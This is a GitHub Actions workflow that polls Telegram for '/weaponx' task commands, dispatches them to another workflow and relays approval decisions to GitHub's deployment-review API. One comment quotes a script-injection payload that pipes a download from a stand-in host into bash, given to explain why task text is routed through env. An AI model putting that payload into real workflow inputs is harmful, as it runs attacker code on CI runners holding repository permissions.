name: PUSH poll (cold-start command intake)

# Cold-start path for PUSH: lets the operator kick off a brand-new weaponx task
# from their phone when NO local session is running. It polls Telegram for new
# "/weaponx <task>" messages from the single allow-listed chat id, and when it
# finds one, triggers push-dispatch.yml to actually run the loop.
#
# HONEST CAVEAT: GitHub's `schedule:` trigger is best-effort, not exact-time. Cron
# here is "at most every ~5 minutes"; under load GitHub can delay or occasionally
# skip runs, and scheduled workflows on the default branch can be disabled after
# ~60 days of repo inactivity. That latency/unreliability is an ACCEPTED tradeoff
# for a cold-start convenience path — it is not the primary way to run weaponx, and
# it is not a bug to be fixed here. When a local session is running, use the Path 1
# long-poll bridge instead, which is immediate.

on:
  schedule:
    # Every 5 minutes (best-effort — see caveat above).
    - cron: "*/5 * * * *"
  workflow_dispatch: {}   # allow manual "poll now" for testing

# Never run two pollers at once — overlapping polls could double-dispatch the same
# command because Telegram's getUpdates offset is advanced per-run, not shared.
concurrency:
  group: push-poll
  cancel-in-progress: false

permissions:
  actions: write   # needed to trigger push-dispatch.yml via the API
  contents: read

jobs:
  poll:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout (for the offset cache key only)
        uses: actions/checkout@v4

      # Persist the last-processed Telegram update_id between runs so we don't
      # re-dispatch a command we already saw. Cache is best-effort; if it misses,
      # we fall back to only processing the newest single command (see below).
      - name: Restore last-seen update offset
        id: offset-cache
        uses: actions/cache@v4
        with:
          path: .push-offset
          key: push-telegram-offset-${{ github.run_id }}
          restore-keys: |
            push-telegram-offset-

      # Tracks which push-dispatch.yml run ids have already had an approval
      # brief posted, so a still-unresolved decision isn't re-briefed every
      # 5-minute tick. Same actions/cache pattern as the offset above.
      - name: Restore approval-seen cache
        id: approval-seen-cache
        uses: actions/cache@v4
        with:
          path: .push-approval-seen
          key: push-approval-seen-${{ github.run_id }}
          restore-keys: |
            push-approval-seen-

      - name: Poll Telegram for new /weaponx commands
        id: poll
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          set -euo pipefail

          if [ -z "${TELEGRAM_BOT_TOKEN}" ] || [ -z "${TELEGRAM_CHAT_ID}" ]; then
            echo "PUSH secrets not set — nothing to poll. (This workflow is inert until configured.)"
            echo "dispatch=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          OFFSET=0
          if [ -f .push-offset ]; then
            OFFSET="$(cat .push-offset)"
          fi

          # callback_query added (Stage 5) — this is the ONE safe cloud-side
          # Telegram consumer (see LEARNING.md / plan: Telegram's getUpdates
          # offset is global per bot token, so every cloud-side capability
          # that reacts to Telegram input, present and future, MUST route
          # through this single poller rather than starting a second one.
          # Do not add a second concurrent getUpdates consumer here.
          RESP="$(curl -sS -X POST \
            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates" \
            --data-urlencode "offset=${OFFSET}" \
            --data-urlencode "timeout=0" \
            --data-urlencode 'allowed_updates=["message","callback_query"]')"

          # Persisted to a file (not $GITHUB_OUTPUT — could be large) so the
          # approval-relay step below can react to the SAME fetched batch
          # without a second getUpdates call, which would burn this run's
          # single legitimate poll on duplicate API traffic.
          printf '%s' "$RESP" > .push-raw-response.json

          if [ "$(echo "$RESP" | jq -r '.ok')" != "true" ]; then
            # A real Telegram API error (bad token, rate limit, a webhook
            # conflict like the one that silently broke this workflow for an
            # extended period — see LEARNING.md, 2026-08-07) is not the same
            # outcome as "polled fine, nothing new to dispatch". Exiting 0
            # here made every failure look identical to success in the
            # Actions tab; exit non-zero instead so the run shows red and is
            # actually visible, while "secrets not set" and "no new command"
            # below stay clean, successful exits — those are real no-ops.
            echo "Telegram getUpdates error: $(echo "$RESP" | jq -r '.description // "unknown"')" >&2
            echo "dispatch=false" >> "$GITHUB_OUTPUT"
            exit 5
          fi

          # Advance the offset past everything we fetched, so the next run starts fresh.
          LAST="$(echo "$RESP" | jq -r '.result | (map(.update_id) | max) // empty')"
          if [ -n "$LAST" ]; then
            echo "$(( LAST + 1 ))" > .push-offset
          fi

          # Find EVERY message from the allow-listed chat that starts with
          # "/weaponx " in this poll window, not just the newest. Taking only
          # `last` used to mean: if two /weaponx commands landed in the same
          # ~5-minute poll window, the older one was silently and permanently
          # dropped — its update_id is still covered by the offset advance
          # above, so Telegram never returns it again, and nothing ever
          # notified the operator it went missing. Verified by running this
          # exact filter against a synthetic two-command payload before
          # fixing it (see LEARNING.md, 2026-08-07). Emitted as a compact
          # (single-line) JSON array, oldest first — jq -c guarantees no
          # literal newlines in the output, so this is $GITHUB_OUTPUT-safe
          # without needing a heredoc.
          TASKS_JSON="$(echo "$RESP" | jq -c \
            --arg chat "${TELEGRAM_CHAT_ID}" '
            [ .result[]
              | select(.message.chat.id|tostring == $chat)
              | select(.message.text != null)
              | select(.message.text | startswith("/weaponx "))
              | (.message.text | sub("^/weaponx "; ""))
            ]
          ')"
          TASK_COUNT="$(echo "$TASKS_JSON" | jq 'length')"

          if [ "$TASK_COUNT" -eq 0 ]; then
            echo "No new /weaponx command from the allow-listed chat this poll."
            echo "dispatch=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          echo "Found ${TASK_COUNT} command(s) this poll; will dispatch each in order (oldest first)."
          echo "dispatch=true" >> "$GITHUB_OUTPUT"
          echo "tasks=${TASKS_JSON}" >> "$GITHUB_OUTPUT"

      - name: Trigger dispatch workflow
        if: steps.poll.outputs.dispatch == 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Routed through env:, not interpolated directly into the script below.
          # Task text comes from a Telegram message — untrusted content, even
          # though only the allow-listed chat can send it. Direct ${{ }}
          # interpolation into a run: block is literal text substitution before
          # bash ever parses it — the classic GitHub Actions script-injection
          # pattern (a task like `"; curl evil.sh | bash #` would execute on the
          # runner with this job's actions:write permissions, not just become
          # task text). env: + "$TASK_TEXT" avoids that; bash does not re-parse
          # an expanded variable's contents for further substitution.
          TASKS_JSON: ${{ steps.poll.outputs.tasks }}
        run: |
          set -euo pipefail
          # Dispatch every command found this poll, oldest first. Each call
          # triggers a separate push-dispatch.yml run; push-dispatch.yml's own
          # `concurrency: group: push-dispatch` (cancel-in-progress: false)
          # queues them to run one at a time rather than in parallel — that
          # concurrency group is what turns "dispatch all of them" into a safe
          # queue instead of N simultaneous headless runs.
          echo "$TASKS_JSON" | jq -r '.[]' | while IFS= read -r TASK_TEXT; do
            gh workflow run push-dispatch.yml \
              --ref "${{ github.ref_name }}" \
              -f task="$TASK_TEXT"
            echo "Dispatched push-dispatch.yml with task: ${TASK_TEXT}"
          done

      # Isolated capability block (Stage 5): a failure here (e.g. `gh run
      # list` erroring) must never abort the /weaponx command-intake logic
      # above, or the relay step below — `if: always()` plus its own
      # internal error handling (no bare `set -euo pipefail` propagating a
      # transient failure into a hard step failure) is what keeps these
      # capabilities independent within the one poll step this design
      # requires (Telegram's global getUpdates offset means there can only
      # be one cloud-side consumer).
      - name: Discover and brief new approval-pending runs
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          set -uo pipefail
          [ -z "${TELEGRAM_BOT_TOKEN}" ] && exit 0 || true

          WAITING_IDS="$(gh run list --workflow push-dispatch.yml --json databaseId,status --jq \
            '[.[] | select(.status=="waiting") | .databaseId] | sort' 2>&1)"
          if [ $? -ne 0 ]; then
            echo "gh run list failed, skipping this poll's approval discovery (isolated — command-intake above is unaffected): $WAITING_IDS" >&2
            exit 0
          fi

          SEEN=".push-approval-seen"
          [ -f "$SEEN" ] || echo '[]' > "$SEEN"
          SEEN_IDS="$(cat "$SEEN")"

          # Prune: drop any previously-seen run id no longer in the current
          # waiting set (resolved via Telegram or directly via the GitHub
          # UI/Mobile fallback — either way, stop tracking it). This is also
          # what keeps the cache from growing without bound.
          PRUNED="$(jq -c --argjson waiting "$WAITING_IDS" '[.[] | select(. as $id | $waiting | index($id))]' <<<"$SEEN_IDS")"

          NEW_IDS="$(jq -c --argjson seen "$PRUNED" '[.[] | select(. as $id | ($seen | index($id)) | not)]' <<<"$WAITING_IDS")"
          NEW_COUNT="$(jq 'length' <<<"$NEW_IDS")"

          if [ "$NEW_COUNT" -eq 0 ]; then
            echo "No newly-waiting push-dispatch.yml runs this poll."
            printf '%s' "$PRUNED" > "$SEEN"
            exit 0
          fi

          echo "Found ${NEW_COUNT} newly-waiting run(s); briefing each."
          UPDATED="$PRUNED"
          for RUN_ID in $(jq -r '.[]' <<<"$NEW_IDS"); do
            RUN_URL="${{ github.server_url }}/${{ github.repository }}/actions/runs/${RUN_ID}"
            if .claude/skills/weaponx-push/bin/push-bridge.sh brief \
                --id "approve-${RUN_ID}" \
                --text "A weaponx run is waiting on your ship approval. Review before deciding: ${RUN_URL}" \
                --option "Approve" --option "Reject" \
                --timeout 86400; then
              UPDATED="$(jq -c --argjson id "$RUN_ID" '. + [$id]' <<<"$UPDATED")"
            else
              echo "Failed to post approval brief for run ${RUN_ID}, will retry next poll (not added to seen cache)." >&2
            fi
          done
          printf '%s' "$UPDATED" > "$SEEN"

      # Second isolated capability block: relays a resolved Telegram reply
      # to GitHub's deployment-review API using the dedicated-account PAT
      # (WEAPONX_APPROVAL_REVIEWER_PAT — see SETUP.md; classic PAT, full
      # `repo` scope, since that specific endpoint requires it and
      # fine-grained tokens cannot target a repo this account doesn't own —
      # confirmed against GitHub's own docs, not assumed). Scoped to this
      # one step only; never exposed to push-dispatch.yml's `run` job, which
      # executes semi-trusted generated commands.
      - name: Relay approval decision to GitHub
        if: always()
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          APPROVAL_PAT: ${{ secrets.WEAPONX_APPROVAL_REVIEWER_PAT }}
        run: |
          set -uo pipefail
          if [ -z "${TELEGRAM_BOT_TOKEN}" ] || [ -z "${APPROVAL_PAT}" ]; then
            exit 0
          fi
          [ -f .push-raw-response.json ] || exit 0
          [ -f .push-approval-seen ] || exit 0

          RESP="$(cat .push-raw-response.json)"
          SEEN_IDS="$(cat .push-approval-seen)"

          for RUN_ID in $(jq -r '.[]' <<<"$SEEN_IDS"); do
            DECISION_ID="approve-${RUN_ID}"
            IDPFX="${DECISION_ID}|"

            # Button tap: callback_data "approve-<run_id>|0" (Approve) or
            # "...|1" (Reject) — same encoding push-bridge.sh's do_brief uses.
            CB_DATA="$(jq -r --arg chat "$TELEGRAM_CHAT_ID" --arg idpfx "$IDPFX" \
              '[.result[] | select(.callback_query != null) | select(.callback_query.message.chat.id|tostring == $chat) | select(.callback_query.data | startswith($idpfx))] | last | .callback_query.data // empty' \
              <<<"$RESP")"

            DECISION=""
            if [ -n "$CB_DATA" ]; then
              IDX="${CB_DATA#"$IDPFX"}"
              [ "$IDX" = "0" ] && DECISION="approved"
              [ "$IDX" = "1" ] && DECISION="rejected"
            else
              # Typed fallback: a bare "approve"/"reject" (case-insensitive)
              # sent from the allow-listed chat while this decision is
              # pending. Simple on purpose — this is a fallback path, not
              # the primary interaction (buttons are).
              TEXT_REPLY="$(jq -r --arg chat "$TELEGRAM_CHAT_ID" \
                '[.result[] | select(.message.chat.id|tostring == $chat) | select(.message.text != null)] | last | .message.text // empty' \
                <<<"$RESP")"
              case "$(echo "$TEXT_REPLY" | tr '[:upper:]' '[:lower:]')" in
                approve) DECISION="approved" ;;
                reject) DECISION="rejected" ;;
              esac
            fi

            [ -z "$DECISION" ] && continue

            echo "Relaying decision '${DECISION}' for run ${RUN_ID}..."
            ENV_LOOKUP="$(curl -sS -w '\n%{http_code}' -H "Authorization: Bearer ${APPROVAL_PAT}" \
              "https://api.github.com/repos/${{ github.repository }}/actions/runs/${RUN_ID}/pending_deployments")"
            ENV_STATUS="$(echo "$ENV_LOOKUP" | tail -n1)"
            ENV_BODY="$(echo "$ENV_LOOKUP" | sed '$d')"

            if [ "$ENV_STATUS" != "200" ]; then
              echo "GET pending_deployments failed (HTTP ${ENV_STATUS}): ${ENV_BODY}" >&2
              curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
                --data-urlencode "text=Couldn't relay your decision (${ENV_STATUS} — PAT may be expired, missing scope, or the run is no longer waiting). Please use the GitHub UI/Mobile app for this one: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${RUN_ID}" \
                --data-urlencode "disable_web_page_preview=true" >/dev/null 2>&1 || true
              continue
            fi

            ENV_ID="$(echo "$ENV_BODY" | jq -r '.[] | select(.environment.name=="weaponx-approval") | .environment.id')"
            if [ -z "$ENV_ID" ]; then
              echo "No weaponx-approval pending_deployment found for run ${RUN_ID} (already resolved elsewhere?)." >&2
              curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
                --data-urlencode "text=Already handled — that run isn't waiting on approval anymore, no action needed." \
                --data-urlencode "disable_web_page_preview=true" >/dev/null 2>&1 || true
              continue
            fi

            REVIEW_BODY="$(jq -nc --argjson env "$ENV_ID" --arg state "$DECISION" --arg comment "Relayed via Telegram (chat ${TELEGRAM_CHAT_ID}): ${DECISION}" \
              '{environment_ids: [$env], state: $state, comment: $comment}')"
            RELAY="$(curl -sS -w '\n%{http_code}' -X POST -H "Authorization: Bearer ${APPROVAL_PAT}" \
              "https://api.github.com/repos/${{ github.repository }}/actions/runs/${RUN_ID}/pending_deployments" \
              -d "$REVIEW_BODY")"
            RELAY_STATUS="$(echo "$RELAY" | tail -n1)"

            if [ "$RELAY_STATUS" = "200" ]; then
              curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
                --data-urlencode "text=Done — relayed your decision (${DECISION}) to GitHub." \
                --data-urlencode "disable_web_page_preview=true" >/dev/null 2>&1 || true
            elif [ "$RELAY_STATUS" = "422" ]; then
              # Distinguish self-caused (a double-tap already resolved this
              # exact decision) from a genuine race (resolved differently,
              # e.g. via the GitHub UI) — re-check current state rather than
              # reporting a misleading failure right after a real success.
              RECHECK="$(curl -sS -H "Authorization: Bearer ${APPROVAL_PAT}" \
                "https://api.github.com/repos/${{ github.repository }}/actions/runs/${RUN_ID}/pending_deployments")"
              STILL_PENDING="$(echo "$RECHECK" | jq -r '[.[] | select(.environment.name=="weaponx-approval")] | length')"
              if [ "$STILL_PENDING" = "0" ]; then
                curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                  --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
                  --data-urlencode "text=Already handled, no action needed — that decision was already resolved." \
                  --data-urlencode "disable_web_page_preview=true" >/dev/null 2>&1 || true
              else
                curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                  --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
                  --data-urlencode "text=Couldn't relay your decision (422 — someone else may have acted on it differently). Check the GitHub UI: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${RUN_ID}" \
                  --data-urlencode "disable_web_page_preview=true" >/dev/null 2>&1 || true
              fi
            else
              echo "pending_deployments POST failed (HTTP ${RELAY_STATUS})" >&2
              curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \
                --data-urlencode "text=Couldn't relay your decision (HTTP ${RELAY_STATUS} — PAT may be expired or missing scope). Please use the GitHub UI/Mobile app for this one: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${RUN_ID}" \
                --data-urlencode "disable_web_page_preview=true" >/dev/null 2>&1 || true
            fi

            # Remove from the seen cache regardless of outcome above — a
            # relay success, a self-caused 422, or a genuine race all mean
            # this decision is done being tracked here (a real failure path
            # still points the human at the GitHub UI, which doesn't depend
            # on this cache at all).
            jq -c --argjson id "$RUN_ID" '[.[] | select(. != $id)]' .push-approval-seen > .push-approval-seen.tmp
            mv .push-approval-seen.tmp .push-approval-seen
          done
